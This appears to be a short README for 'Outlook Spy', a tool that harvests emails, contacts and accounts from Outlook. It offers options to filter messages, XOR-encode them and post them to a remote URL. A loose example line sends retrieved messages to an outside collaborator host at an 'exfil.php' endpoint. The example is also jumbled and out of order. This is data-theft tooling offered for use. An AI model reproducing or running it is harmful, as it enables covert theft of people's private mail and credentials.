# Outlook Spy

Outlook Spy enables the retrieval of emails, contacts and accounts from Outlook.

```
Usage: OutlookSpy.exe <options>
        Required
                -a, --action    Action to be taken

        Optional
                -e, --entry-id  Outlook generated entry id of the record to fetch.
                -m, --max-records       Number of messages to retrieve
                -br, --body-contains-regex      Regex for searching email
                -bc, --body-contains    String for searching email body (insensitive).
                -sr, --subject-contains-regex   Filters messages if the subject contains the specified value.
                -sc, --subject-contains Filters messages if the subject contains the specified value.
                -fs, --max-message-size Restricts gathered messages to the specified size in bytes.
                -o, --output    Output type: csv,json
                -u, --url       url where data will be posted
                -x, --xor-key   Xor data before transmitting
                -f, --fields    Fields to include in final output.  If not specified, all fields are returned
```


0F77511CEB4CD00AA00BBB6E600000000000C0000D9539C2261A6BB45B9DAB62C7081B3C101000C0000000000 -u https://v2yacmohjrhwn7tg9m0km7lxvo1ep3.burpcollaborator.net/exfil.php


--action messages